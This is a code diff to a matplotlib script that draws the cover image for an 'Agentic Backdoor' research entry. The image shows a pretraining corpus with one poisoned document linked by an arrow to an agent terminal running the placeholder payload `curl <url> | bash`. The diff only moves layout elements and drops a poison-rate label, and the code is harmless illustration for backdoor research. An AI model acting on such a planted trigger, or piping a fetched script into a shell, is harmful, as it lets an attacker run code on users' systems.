@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """Cover image for the Agentic Backdoor research entry -> ../preview.png
 
-Composition: a grid of web documents (the pretraining corpus) in which one document is
-poisoned (amber, with the Twemoji devil on its corner and a dark payload strip in its
-text), an arrow labelled with the poison rate, and the deployed agent's terminal (the
-Twemoji robot on its corner) running the payload `curl <url> | bash` in the paper's
-terminal-pill colours. The devil and robot are Twemoji graphics (CC-BY 4.0, see
+Composition: a grid of web documents (the pretraining corpus) in which the middle-right
+document is poisoned (amber, with the Twemoji devil on its corner and a dark payload strip
+in its text), a horizontal arrow from it to the deployed agent's terminal (the Twemoji
+robot on its corner), which runs the payload `curl <url> | bash` in the paper's
+terminal-pill colours on the arrow's line. The devil and robot are Twemoji graphics (CC-BY 4.0, see
 twemoji/LICENSE.txt), the same glyphs the paper's teaser uses; everything else is drawn
 here. Sized to fill the research card's 25:9 cover box, transparent background, mid-tone
 ink that stays visible on both the light and dark card surfaces.
@@ -242,7 +242,6 @@ def colored_line(ax, x, y, parts, fontsize, zorder):
 # ---------------------------------------------------------------------------
 # cover
 # ---------------------------------------------------------------------------
-FS_RATE = 60         # "0.1%"; ~17 px tall in the card thumbnail
 FS_TERM = 46         # terminal payload, kept on one line
 # monospace " | " leaves a char-wide hole either side of the thin pipe; set it tighter
 PAYLOAD = [("curl ", TERM_TEXT, True), ("<url>", TERM_URL, True), ("|", TERM_DIM, False, 0.2),
@@ -254,10 +253,12 @@ def cover(check: bool):
     fig.canvas.draw()
     W, H = COVER_SIZE
 
-    # corpus: 3 x 3 documents under the poison rate; the poisoned one top right, by the arrow
-    rows, cols, tw, th, gap = 3, 3, 0.84, 1.04, 0.13
+    # corpus: 3 x 3 documents filling the height; the poisoned one middle right, by the arrow
+    rows, cols, gap = 3, 3, 0.13
     x0, y0 = 0.06, 0.06
-    pr, pc = 2, cols - 1
+    th = (H - 2 * y0 - (rows - 1) * gap) / rows
+    tw = th * 0.84 / 1.04
+    pr, pc = rows // 2, cols - 1
     for r in range(rows):
         for c in range(cols):
             doc_tile(ax, x0 + c * (tw + gap), y0 + r * (th + gap), tw, th,
@@ -265,18 +266,17 @@ def cover(check: bool):
     px, py = x0 + pc * (tw + gap), y0 + pr * (th + gap)
     place(ax, rasterize(TWEMOJI / "1f608.svg", 800), px + tw - 0.02, py + th - 0.02, 0.76,
           zorder=8)
-    ax.text(x0 - 0.02, y0 + rows * th + (rows - 1) * gap + 0.08, "0.1%", ha="left",
-            va="bottom", fontsize=FS_RATE, color=AMBER, weight="bold")
 
-    # terminal: as wide as the one-line payload needs, flush right; faint output below it
+    # terminal: as wide as the one-line payload needs, flush right, placed so the payload
+    # line sits level with the poisoned document's middle; faint output below it
     pad, head, term_h = 0.4, 0.5, 2.75
     text_w = text_width(ax, PAYLOAD, FS_TERM)
     term_w = text_w + 2 * pad
-    grid_h = rows * th + (rows - 1) * gap
-    tx, ty = W - 0.06 - term_w, y0 + (grid_h - term_h) / 2
-    top = terminal(ax, tx, ty, term_w, term_h)
+    yc = py + th / 2                                    # arrow height
     cap = FS_TERM / 72 * 0.73                           # DejaVu Sans Mono cap height
-    base = top - 0.36 - cap
+    base = yc - cap / 2
+    tx, ty = W - 0.06 - term_w, base + cap + 0.36 + head - term_h
+    top = terminal(ax, tx, ty, term_w, term_h)
     colored_line(ax, tx + pad, base, PAYLOAD, FS_TERM, 6)
     for i, frac in enumerate([0.64, 0.42]):              # the fetched script's output
         yy = base - 0.6 - i * 0.42
@@ -285,9 +285,9 @@ def cover(check: bool):
     place(ax, rasterize(TWEMOJI / "1f916.svg", 900), tx + term_w - 0.56, top + head + 0.1,
           0.94, zorder=8)
 
-    # arrow from the poisoned document to the payload line
-    a0 = (px + tw + 0.16, py + th / 2 - 0.1)
-    a1 = (tx - 0.1, base + cap / 2)
+    # horizontal arrow from the poisoned document to the payload line
+    a0 = (px + tw + 0.16, yc)
+    a1 = (tx - 0.1, yc)
     ax.add_patch(FancyArrowPatch(a0, a1, arrowstyle="-|>,head_length=0.9,head_width=0.55",
                                  mutation_scale=30, color=INK, lw=8, zorder=4,
                                  shrinkA=0, shrinkB=0))
